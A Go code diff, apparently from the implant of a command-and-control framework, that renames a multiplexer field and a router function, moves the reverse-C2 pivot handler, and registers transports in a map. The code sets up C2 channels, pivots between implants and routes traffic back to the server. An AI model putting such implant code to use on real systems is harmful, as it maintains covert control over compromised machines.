@@ -58,8 +58,8 @@ type Transport struct {
 	// "physical connection" does not yield a net.Conn.
 	Conn net.Conn
 
-	// Multiplexer - Able to derive stream from the physical conn above.
-	Multiplexer *yamux.Session
+	// multiplexer - Able to derive stream from the physical conn above.
+	multiplexer *yamux.Session
 
 	// The RPC layer added around a net.Conn stream, used by implant to talk with the server.
 	// It is either setup on top of physical conn, or of a muxed stream.
@@ -186,7 +186,7 @@ ConnLoop:
 	// If not, all C2 RPC layer is already set for this transport.
 	if t.IsMux {
 		// The C2 server is here the yamux.Client requiring to open a session.
-		t.Multiplexer, err = yamux.Server(t.Conn, nil)
+		t.multiplexer, err = yamux.Server(t.Conn, nil)
 		if err != nil {
 			// {{if .Config.Debug}}
 			log.Printf("[mux] Error setting up Multiplexer server: %s", err)
@@ -199,7 +199,7 @@ ConnLoop:
 			t.setupMuxC2()
 
 			// Setup the transport's router
-			t.Router = StartMuxRouter(t.Multiplexer)
+			t.Router = startMuxRouter(t.multiplexer)
 		}
 	}
 
@@ -207,6 +207,9 @@ ConnLoop:
 	// We now either send a registration envelope, or anything.
 	activeConnection = t.C2
 	activeC2 = t.URL.String()
+
+	// Add transport to Transports map.
+	Transports.Add(t)
 
 	// {{if .Config.Debug}}
 	log.Printf("Transport %d set up and running (%s)", t.ID, t.URL)
@@ -221,7 +224,7 @@ func (t *Transport) StartMuxPivot(conn net.Conn, routeID uint32) (err error) {
 
 	// Setup multiplexing first, and return if any error.
 	// The implant here acts as the C2 server.
-	t.Multiplexer, err = yamux.Client(t.Conn, nil)
+	t.multiplexer, err = yamux.Client(t.Conn, nil)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[mux] Error setting up (pivot) multiplexer client: %s", err)
@@ -233,46 +236,13 @@ func (t *Transport) StartMuxPivot(conn net.Conn, routeID uint32) (err error) {
 	// {{end}}
 
 	// Setup the transport's router
-	t.Router = StartMuxRouter(t.Multiplexer)
+	t.Router = startMuxRouter(t.multiplexer)
 
 	// The first stream is the pivoted implant registering and speaking RPC.
 	go t.handleReverseC2(routeID)
 
-	return
-}
-
-// HandleReverseC2 - The transport's other end is a pivoted implant, and we
-// handle the first stream over which the pivoted implant will speak RPC.
-// This function will probably be rewritten, given that transports will have to handle
-// various types of traffic like UDP connections, and that routing will have to be efficient
-// for those as well.
-func (t *Transport) handleReverseC2(routeID uint32) (err error) {
-
-	src, err := t.Multiplexer.Open()
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("[mux] Error opening first stream: %s", err.Error())
-		// {{end}}
-	}
-
-	// Connect back with the route ID provided and route the connection.
-	var route bon.Route = bon.Route(routeID)
-	// {{if .Config.Debug}}
-	log.Printf("[mux] Route: ID is %d", routeID)
-	// {{end}}
-
-	dst, err := ServerComms.Router.Connect(route)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("[route] Error connecting to next node: %s", err.Error())
-		// {{end}}
-		return
-	}
-	// {{if .Config.Debug}}
-	log.Printf("[mux] Outbound stream: muxing conn and piping")
-	// {{end}}
-
-	transport(src, dst) // Pipe connection
+	// Add transport to Transports map.
+	Transports.Add(t)
 
 	return
 }
@@ -319,7 +289,7 @@ func (t *Transport) setupMuxC2() (err error) {
 			// {{if .Config.Debug}}
 			log.Printf("[mux] Waiting for CC to open C2 stream...")
 			// {{end}}
-			stream, _ := t.Multiplexer.Accept()
+			stream, _ := t.multiplexer.Accept()
 			inbound <- stream
 			return
 		case <-timedOut:
@@ -344,6 +314,42 @@ func (t *Transport) setupMuxC2() (err error) {
 		// {{end}}
 		t.phyConnFallBack()
 	}
+
+	return
+}
+
+// HandleReverseC2 - The transport's other end is a pivoted implant, and we
+// handle the first stream over which the pivoted implant will speak RPC.
+// This function will probably be rewritten, given that transports will have to handle
+// various types of traffic like UDP connections, and that routing will have to be efficient
+// for those as well.
+func (t *Transport) handleReverseC2(routeID uint32) (err error) {
+
+	src, err := t.multiplexer.Open()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[mux] Error opening first stream: %s", err.Error())
+		// {{end}}
+	}
+
+	// Connect back with the route ID provided and route the connection.
+	var route bon.Route = bon.Route(routeID)
+	// {{if .Config.Debug}}
+	log.Printf("[mux] Route: ID is %d", routeID)
+	// {{end}}
+
+	dst, err := ServerComms.Router.Connect(route)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[route] Error connecting to next node: %s", err.Error())
+		// {{end}}
+		return
+	}
+	// {{if .Config.Debug}}
+	log.Printf("[mux] Outbound stream: muxing conn and piping")
+	// {{end}}
+
+	transport(src, dst) // Pipe connection
 
 	return
 }
@@ -412,15 +418,15 @@ func (t *Transport) phyConnFallBack() (err error) {
 	// {{end}}
 
 	// First make sure all mux code is cleanup correctly.
-	if t.Multiplexer != nil {
-		err = t.Multiplexer.GoAway()
+	if t.multiplexer != nil {
+		err = t.multiplexer.GoAway()
 		if err != nil {
 			// {{if .Config.Debug}}
 			log.Printf("[mux] Error sending GoAway: %s", err)
 			// {{end}}
 		}
 
-		err = t.Multiplexer.Close()
+		err = t.multiplexer.Close()
 		// {{if .Config.Debug}}
 		log.Printf("[mux] Error closing session: %s", err)
 		// {{end}}
@@ -440,21 +446,21 @@ func (t *Transport) Stop(force bool) (err error) {
 
 	if t.IsMux {
 		if t.IsRouting() && !force {
-			return fmt.Errorf("Cannot stop transport: %d streams still opened", t.Multiplexer.NumStreams())
+			return fmt.Errorf("Cannot stop transport: %d streams still opened", t.multiplexer.NumStreams())
 		}
 
 		// {{if .Config.Debug}}
 		log.Printf("[mux] closing all muxed streams")
 		// {{end}}
 
-		err = t.Multiplexer.GoAway()
+		err = t.multiplexer.GoAway()
 		if err != nil {
 			// {{if .Config.Debug}}
 			log.Printf("[mux] Error sending GoAway: %s", err)
 			// {{end}}
 		}
 
-		err = t.Multiplexer.Close()
+		err = t.multiplexer.Close()
 		// {{if .Config.Debug}}
 		log.Printf("[mux] Error closing session: %s", err)
 		// {{end}}
@@ -521,7 +527,7 @@ func (t *Transport) HandleRouteConn(route *pb.Route, src net.Conn) error {
 func (t *Transport) IsRouting() bool {
 
 	if t.IsMux {
-		activeStreams := t.Multiplexer.NumStreams()
+		activeStreams := t.multiplexer.NumStreams()
 		// If there is an active C2, there is at least one open stream,
 		// that we do not count as "important" when stopping the Transport.
 		if (t.C2 != nil && activeStreams > 1) || (t.C2 == nil && activeStreams > 0) {
@@ -534,10 +540,10 @@ func (t *Transport) IsRouting() bool {
 	return false
 }
 
-// StartMuxRouter - When the first route is registered, we register a mux router.
+// startMuxRouter - When the first route is registered, we register a mux router.
 // After this call, the implant is able to route traffic that is being forwarded
 // by the previous node in the chain (server -> pivot -> this implant).
-func StartMuxRouter(mux *yamux.Session) (router *bon.Bon) {
+func startMuxRouter(mux *yamux.Session) (router *bon.Bon) {
 	// {{if .Config.Debug}}
 	log.Printf("Starting mux stream router")
 	// {{end}}
